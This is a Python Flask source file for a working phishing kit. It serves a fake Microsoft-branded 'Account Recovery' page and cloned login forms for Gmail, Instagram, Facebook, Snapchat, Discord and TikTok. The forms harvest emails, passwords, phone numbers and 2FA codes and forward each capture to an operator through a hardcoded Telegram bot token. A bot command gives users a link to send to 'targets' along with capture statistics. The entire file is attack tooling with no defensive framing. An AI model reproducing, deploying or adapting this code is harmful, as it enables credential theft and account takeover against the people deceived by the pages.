from flask import Flask, request, render_template_string
import os
import requests
import threading
import time
import random

app = Flask(__name__)

BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')
PHISHING_DATA = []
STATS = {'visits': 0, 'captures': 0}
running = True
last_update_id = 0  # ✅ FIXED SPAM!

HTML_MAIN = """
<!DOCTYPE html>
<html><head><title>Microsoft</title><meta name="viewport" content="width=device-width"></head><body style="margin:0;font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;">
<div style="background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.3);padding:30px;max-width:400px;width:100%;text-align:center;">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/256px-Microsoft_logo.svg.png" style="width:60px;margin-bottom:20px;">
<h2 style="color:#333;margin:0 0 30px;">🔒 Account Recovery</h2>
<p style="color:#666;margin-bottom:25px;">Select service to recover:</p>
<div style="display:grid;gap:15px;">
<a href="/hack/gmail/{{user_id}}" style="background:#4285f4;color:white;padding:15px;border-radius:12px;text-decoration:none;font-weight:500;">📧 Gmail</a>
<a href="/hack/insta/{{user_id}}" style="background:#e4405f;color:white;padding:15px;border-radius:12px;text-decoration:none;font-weight:500;">📸 Instagram</a>
<a href="/hack/facebook/{{user_id}}" style="background:#1877f2;color:white;padding:15px;border-radius:12px;text-decoration:none;font-weight:500;">📘 Facebook</a>
<a href="/hack/snapchat/{{user_id}}" style="background:#fffc00;color:#000;padding:15px;border-radius:12px;text-decoration:none;font-weight:500;">👻 Snapchat</a>
<a href="/hack/discord/{{user_id}}" style="background:#5865f2;color:white;padding:15px;border-radius:12px;text-decoration:none;font-weight:500;">💬 Discord</a>
<a href="/hack/tiktok/{{user_id}}" style="background:#000;color:white;padding:15px;border-radius:12px;text-decoration:none;font-weight:500;">🎵 TikTok</a>
</div>
</div></body></html>
"""

def send_msg(chat_id, text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     data={'chat_id':chat_id,'text':text,'parse_mode':'Markdown'}, timeout=5)
    except: pass

def bot_loop():
    global last_update_id
    while running:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", 
                              params={'offset':last_update_id+1,'timeout':20}).json()
            if resp['ok']:
                for update in resp['result']:
                    last_update_id = update['update_id']  # ✅ NO SPAM!
                    msg = update['message']
                    cid = msg['chat']['id']
                    txt = msg.get('text', '').lower()
                    uid = msg['from']['id']
                    
                    if '/start' in txt:
                        url = f"https://myphish.onrender.com/phish/{uid}"
                        send_msg(cid, f"🔗 **Your Link:**\n`{url}`\n\n📱 Send to target!")
                    
                    elif txt == '/stats':
                        rate = STATS['captures']/max(STATS['visits'],1)*100
                        send_msg(cid, f"📊 **STATS**\n🎯 Captures: `{STATS['captures']}`\n👀 Visits: `{STATS['visits']}`\n✅ Rate: `{rate:.1f}%`")
                    
                    elif txt == '/data' and str(cid) == ADMIN_CHAT_ID:
                        if PHISHING_DATA:
                            recent = PHISHING_DATA[-5:]
                            data_text = "\n".join([f"🎣 `{d['email']}` | `{d['pass']}` [{d['service']}]" for d in recent])
                            send_msg(cid, f"💾 **LATEST HITS:**\n{data_text}")
                        else:
                            send_msg(cid, "📭 No data yet!")
        except: pass
        time.sleep(1)

@app.route('/')
def home():
    return f"<h1>🎣 PHISH LIVE!</h1><pre>{STATS['visits']} visits | {STATS['captures']} hits</pre>"

@app.route('/phish/<int:user_id>')
def main_phish(user_id):
    STATS['visits'] += 1
    return render_template_string(HTML_MAIN, user_id=user_id)

@app.route('/hack/<service>/<int:user_id>')
def service_phish(service, user_id):
    services = {'gmail':'Gmail', 'insta':'Instagram', 'facebook':'Facebook', 'snapchat':'Snapchat', 'discord':'Discord', 'tiktok':'TikTok'}
    service_name = services.get(service, 'Account')
    return render_template_string(LOGIN_TEMPLATE, user_id=user_id, service=service_name)

@app.route('/hack/<service>/<int:user_id>', methods=['POST'])
def service_hit(service, user_id):
    STATS['captures'] += 1
    data = {
        'email':request.form['email'],
        'pass':request.form['password'],
        'phone':request.form.get('phone',''),
        'otp':request.form.get('otp',''),
        'service':service.upper(),
        'ip':request.remote_addr,
        'ua':request.headers.get('User-Agent','')
    }
    PHISHING_DATA.append(data)
    
    if ADMIN_CHAT_ID:
        send_msg(ADMIN_CHAT_ID, f"🎣 **{data['service']} HIT**\n"
                               f"📧 `{data['email']}`\n"
                               f"🔑 `{data['pass']}`\n"
                               f"📱 `{data['phone']}`\n"
                               f"🔢 `{data['otp']}`")
    
    return '<script>alert("✅ Verified!");history.back();</script>'

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>{{service}}</title><meta name="viewport" content="width=device-width"></head>
<body style="margin:0;font-family:Arial;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px;">
<div style="background:white;padding:30px;border-radius:15px;box-shadow:0 15px 35px rgba(0,0,0,0.2);max-width:380px;width:100%;">
<h2 style="color:#333;margin:0 0 20px;text-align:center;">🔐 {{service}} Recovery</h2>
<form method=POST>
<input name=email placeholder=Email/Username type=email style="width:100%;padding:15px;margin-bottom:15px;border:2px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:16px;">
<input name=password placeholder=Password type=password style="width:100%;padding:15px;margin-bottom:15px;border:2px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:16px;">
<input name=phone placeholder=Phone (optional) type=tel style="width:100%;padding:15px;margin-bottom:15px;border:2px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:16px;">
<input name=otp placeholder=2FA Code (if enabled) type=text style="width:100%;padding:15px;margin-bottom:20px;border:2px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:16px;">
<input name=user_id type=hidden value="{{user_id}}"><input name=service type=hidden value="{{service}}">
<button type=submit style="width:100%;padding:16px;background:linear-gradient(45deg,#667eea,#764ba2);color:white;border:none;border-radius:8px;font-size:18px;font-weight:500;cursor:pointer;">🔓 Verify & Recover</button>
</form>
<p style="text-align:center;margin-top:20px;color:#666;font-size:14px;">Secure verification required</p>
</div></body></html>
"""

if __name__ == '__main__':
    threading.Thread(target=bot_loop, daemon=True).start()
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port)
